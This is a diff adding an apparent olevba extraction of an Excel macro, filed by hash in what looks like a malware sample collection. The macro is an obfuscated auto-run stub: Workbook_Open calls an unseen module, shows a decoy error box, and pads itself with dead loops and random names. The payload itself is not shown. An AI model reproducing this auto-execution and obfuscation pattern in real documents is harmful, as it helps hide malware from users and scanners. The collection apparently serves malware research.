@@ -1,0 +1,70 @@
+Filename     : ./macros/b08de9018d97a699b67417bb4b1c10ff23c7a3a17f1010b662575b32dbaddb6a
+OLE stream   : _VBA_PROJECT_CUR/VBA/ThisWorkbook
+VBA filename : ThisWorkbook.cls
+----------------------------------------
+Attribute VB_Name = "ThisWorkbook"
+Attribute VB_Base = "0{00020819-0000-0000-C000-000000000046}"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = True
+Attribute VB_Exposed = True
+Attribute VB_TemplateDerived = False
+Attribute VB_Customizable = True
+Private Sub workbook_open()
+
+
+wYzgTLN.qtxFtQGzNTQnQRSOFZbN
+Do Until "OhRroXfrGELEwACb" <> "JSKVNuWGvRPKjMvGQcpJcGQVlPsIH"
+Dim MrQPrEmPGAUKKvXHVIuIEnUKsyDCokyBNyiaz As Integer
+Dim vrHJqJcUyRKtNQHxACYXFWsBkbWBTxMMwI As String
+Loop
+Do Until "ZQmzNerpthtIaTrENwKC" <> "tYyGZPnaBBFxwFqqKBo"
+Dim ufPdLHbACKPjQCuPBRgZxqRorbvMVdAtMHQXdvmyxPlP As Integer
+Dim mSpvCqpYebqEOblkLPeZKVXImWlFehbiFBBZmAJfnb As String
+Loop
+Do Until "OlQMIBJCnik" <> "LFQugIfEjtxzIyMa"
+Dim MyLFzliHmsaNjwcutxtwkeFsdbEhRlINwbxEccl As Integer
+Dim aWJIoiSUnRCFKEQphsScYgBpAkMRHzXSRMTZbVQJLGRQOgxIfmPLJ As String
+Loop
+Do Until "zMtVUIEVAMntkoylrOL" <> "bJRRPlaUmEmVjMJRzZEG"
+Dim NMnKudWerzXoYDjziuektoRROrEhbXyMmHyPVGXlPwcnhyxfcJiFu As Integer
+Dim UNZuWwCZoCUBLBQFUecWtVwLekQuYFSotRSu As String
+Loop
+Do Until "ZUyJULau" <> "ImWwgaHeFiBzQNQmgIBik"
+Dim fHtjWgAfSChuCDsOTNxxnjKPTeLDMdLKrKcecNJuHyngTFNKYYMuDlw As Integer
+Dim wwdQsUwToqWCsbNlGECpowewNQBfoRQH As String
+Loop
+Do Until "GNfhyxRZLfypwCViKmGqAv" <> "HAR"
+Dim hCcTQfXZPvfvgnJndeJxpzLvSUBLaGKFfPQupGuAbQhGpnezxDX As Integer
+Dim RyCcirgBwdLyJlZPQWOxWjIWYS As String
+Loop
+
+oNUKAmaldX = MsgBox("", vbCritical, "XMET400")
+Do Until "EFeqBOW" <> "isGcmiDIFyWPRXVQXNdiFAhq"
+Dim fEQmbWFbxcasTmeoKp As Integer
+Dim RlmHGuipGdYfRiKQwhRQgisuRpxcwljoYPiwDYyWElPcCSKrhCpwWtIjsrq As String
+Loop
+Do Until "QwFsVtkGBzOMYjvMu" <> "TQrzeFvtvnRfHzDLihZyttiSLJsS"
+Dim qRMbgNPcAqlrKyaGSbuAKAqCVOBZhZnVNcDdaqytjbLrvinuScA As Integer
+Dim jPrIpbJFSMpvaCQdivwfbdBQjoyGnaHGFYEGVUOCRk As String
+Loop
+Do Until "fgugkofEFzWwYGObY" <> "AcC"
+Dim SsEipByKINgtOrxUWDDJbiUHkIAxruwNZOSnbLqj As Integer
+Dim pUwsSchgItEUwSajYwygBBSNRSUAZKsKNUT As String
+Loop
+Do Until "HlcpIbToxpbRGniOeNJhoCjazIgH" <> "xBtHbzTyvHpFhMUXqBNNqvNxDnf"
+Dim FCBpAuMrwvUpHTkSXXDAbhLkxvTQBowDoTOv As Integer
+Dim uRpKVVYcVMFtGdpZzmDXrRsEbvpIzQAoFoYFiteGJiOlq As String
+Loop
+Do Until "ZJYyWDBPqDdZkjagQdELQoSE" <> "krGHxOICH"
+Dim OBlQJcNyYOlvgxJEatFJZZlrUOfwtSbubSWip As Integer
+Dim PGBrNsZhJDuxDWVDs As String
+Loop
+Do Until "hpPtwvwQEF" <> "nqUO"
+Dim aaPKmESLhMKKKlyqvGrikhTvTLEaImmqppTWnMjzaVHCilkLROJ As Integer
+Dim gzldtHTqazrDuaTVVRcCjXrHOZQNhbsIucFrDLZ As String
+Loop
+
+
+End Sub
+
